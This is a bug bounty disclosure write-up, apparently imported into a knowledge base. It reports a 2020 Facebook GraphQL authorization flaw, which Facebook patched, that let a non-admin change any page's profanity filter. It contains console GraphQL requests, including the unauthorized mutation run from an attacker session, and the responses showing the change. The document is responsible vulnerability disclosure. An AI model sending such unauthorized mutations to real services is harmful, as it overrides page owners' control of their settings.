---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-12_change-the-profanity-filter-for-any-facebook-page.md
original_filename: 2020-05-12_change-the-profanity-filter-for-any-facebook-page.md
title: Change the profanity filter for any Facebook page
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
- business-logic
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
- business-logic
language: en
raw_sha256: 2dca6fae2e3b525d5d250330634c4c0bb17e4eacf64e378a4b466238ad20e731
text_sha256: 86d2297b5c4b60342203fed301c027b504ba8311551664fd0fde1b9478205906
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Change the profanity filter for any Facebook page

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-12_change-the-profanity-filter-for-any-facebook-page.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql, business-logic
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `2dca6fae2e3b525d5d250330634c4c0bb17e4eacf64e378a4b466238ad20e731`
- Text SHA256: `86d2297b5c4b60342203fed301c027b504ba8311551664fd0fde1b9478205906`


## Content

---
title: "Change the profanity filter for any Facebook page"
page_title: "Change the profanity filter for any Facebook page - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/change-the-profanity-filter-for-any-facebook-page/"
final_url: "https://philippeharewood.com/change-the-profanity-filter-for-any-facebook-page/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization", "Logic flaw"]
bounty: "750"
publication_date: "2020-05-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4593
---

Posted on [May 12, 2020](https://philippeharewood.com/change-the-profanity-filter-for-any-facebook-page/)

# Change the profanity filter for any Facebook page

Facebook seems to have recently introduced an option to change the filter for profane comments. It’s possible as a non admin to change this for any page

1\. Login as AdminOne

2\. Observe the response to the following request that can be done in console
  
  
  new AsyncRequest('/api/graphql').setData({doc_id: 3152386011505033,variables:"{videoID: 1}"}).send()
  
  
  {"data":{"video":{"id":"1","broadcast_blocked_users":[],"broadcast_suspended_users_info":{"edges":[]},"broadcast_id":null,"owner":{"__typename":"Page","__isProfile":"Page","id":"113702895386410","profanity_filter_id":"FILTER_OFF"}}},"extensions":{"is_final":true,"live_query":{"response_digest":"1","priming_token":"1"}}}

This requests the video and the current profanity filter. Trying to request the field manually (`?q=node(ID)`) seems to block me with code: 1675036 as Facebook has blocked arbitrary GraphQL requests globally (May 2020).

3\. Login as AttackerOne

4\. Execute the following request under the console in AttackerOne session
  
  
  new AsyncRequest('/api/graphql').setData({doc_id:2775555902540880,variables:"{input:{actor_id: 2, client_mutation_id:0,page_id: 113702895386410,profanity_setting:'FILTER_MEDIUM'}}"}).send()

5\. Recheck the query from 2 as AdminOne
  
  
  {"data":{"video":{"id":"1","broadcast_blocked_users":[],"broadcast_suspended_users_info":{"edges":[]},"broadcast_id":null,"owner":{"__typename":"Page","__isProfile":"Page","id":"113702895386410","profanity_filter_id":"FILTER_MEDIUM"}}},"extensions":{"is_final":true,"live_query":{"response_digest":"1","priming_token":"1"}}}

The filter was changed.

**Impact** (A verbatim explanation of the bounty by Facebook):  
  
_it’s possible to set the profanity filter for any page via graphql._

**Timeline**

May 12, 2020 – Report sent  
May 12, 2020 – Confirmation of submission by Facebook  
May 15, 2020 – Confirmation of patch by Facebook  
Jun 4, 2020 – $750 Bounty awarded by Facebook
